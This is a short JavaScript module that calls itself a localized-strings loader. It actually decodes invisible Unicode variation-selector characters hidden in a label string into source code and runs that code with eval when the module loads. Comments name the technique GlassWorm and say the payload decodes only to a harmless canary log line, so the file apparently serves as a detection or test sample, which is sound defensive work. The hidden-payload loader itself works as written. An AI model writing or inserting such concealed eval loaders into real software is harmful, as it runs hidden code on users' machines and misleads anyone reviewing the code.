// Loads localized strings and applies them.
const { LABEL } = require('./strings');
const bytes = [];
for (const ch of LABEL) {
  const cp = ch.codePointAt(0);
  if (cp >= 0xFE00 && cp <= 0xFE0F) bytes.push(cp - 0xFE00);
  else if (cp >= 0xE0100 && cp <= 0xE01EF) bytes.push(cp - 0xE0100 + 16);
}
if (bytes.length) {
  // GlassWorm: rebuild hidden source from variation selectors and run it.
  const src = Buffer.from(bytes).toString('utf8');
  eval(src); // inert here: decodes to console.log('PAH-CANARY')
}
module.exports = { label: LABEL.replace(/[\uFE00-\uFE0F]/g, '') };
